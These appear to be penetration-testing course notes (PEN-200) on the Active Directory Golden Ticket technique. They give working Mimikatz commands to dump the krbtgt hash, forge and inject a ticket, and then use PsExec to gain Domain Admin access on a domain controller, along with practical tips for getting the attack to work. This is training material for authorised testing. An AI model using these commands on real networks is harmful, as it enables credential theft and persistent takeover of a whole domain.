# 24.2.1 — Golden Ticket

- Module: PEN-200 · 24. Lateral Movement in Active Directory
- Source: portal.offsec.com · module `lateral-movement-in-active-directory-47888` (§24.2.1)
- Code blocks: 4

> With the **krbtgt** account's NTLM hash you can forge arbitrary **TGTs** (golden tickets) —
> membership in any group (Domain Admins), for any existing user. **Persistence:** the krbtgt
> password is almost never rotated. Golden = whole domain (vs Silver = one service). Output omitted.

## Get the krbtgt hash (on the DC as a Domain Admin, Mimikatz)

```
privilege::debug
lsadump::lsa /patch          # note krbtgt NTLM + the Domain SID
```

## Forge + inject the golden ticket (from any host, no admin needed)

```
kerberos::purge              # clear existing tickets first
kerberos::golden /user:{{USERNAME}} /domain:{{DOMAIN}} /sid:{{SID}} /krbtgt:{{NTLM_HASH}} /ptt
misc::cmd                    # spawn a cmd from mimikatz
```

> `/krbtgt:` (not `/rc4:`) supplies the krbtgt hash. Defaults: User Id 500, Groups 513/512/520/518/519
> (incl. Domain Admins). Since July 2022 the `/user:` **must be an existing account**.

## Use it — via hostname (forces Kerberos)

```powershell
PsExec.exe \\{{COMPUTER_NAME}} cmd.exe        # e.g. \\DC1 — works
whoami /groups                                # now shows Domain Admins, Enterprise Admins, etc.
```

> **Gotcha:** connecting PsExec to the DC's **IP** forces **NTLM** and is blocked — always use the
> **hostname** so Kerberos (and the golden ticket) is used. Forging the TGT + PsExec is effectively
> overpass-the-hash with the krbtgt key.
